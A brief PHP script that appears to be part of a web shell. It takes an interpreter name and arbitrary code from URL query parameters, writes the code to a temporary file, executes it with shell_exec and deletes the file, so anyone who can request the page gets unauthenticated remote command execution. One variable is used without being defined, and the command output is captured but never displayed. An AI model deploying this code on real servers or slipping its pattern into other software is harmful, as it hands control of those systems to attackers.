<?php
function exe($s_c){
    $s_out = "";
    $s_c = $s_c." 2>&1";

    $s_out = @shell_exec($s_c);   
    return $s_out;
}

echo "start";
$s_lang = $_GET['lang'];
$s_code = $_GET['evalcode'];
$s_tmpdir = getcwd();
$s_rand = md5(time().rand(0,100));
$s_script = $s_tmpdir.$s_rand;
file_put_contents($s_script, $s_code);
$s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
unlink($s_script);

?>